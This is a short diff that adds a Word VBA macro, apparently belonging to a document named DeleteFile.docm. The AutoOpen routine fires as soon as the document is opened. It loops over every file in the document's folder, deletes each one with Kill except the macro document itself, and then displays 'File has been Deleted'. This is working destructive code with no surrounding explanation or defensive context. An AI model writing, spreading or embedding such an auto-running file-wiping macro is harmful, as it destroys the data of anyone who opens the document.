@@ -1,0 +1,21 @@
+Sub AutoOpen()
+    LoopThroughFiles
+    MsgBox "File has been Deleted"
+End Sub
+
+Sub LoopThroughFiles()
+    Dim StrFile As String
+    Dim path As String
+    Dim s As String
+    path = ActiveDocument.path & "\"
+    StrFile = Dir(path)
+    Do While Len(StrFile) > 0
+        If StrFile <> "DeleteFile.docm" Then
+            s = path & StrFile
+            Debug.Print s
+            Kill s
+        End If
+        StrFile = Dir
+    Loop
+End Sub
+
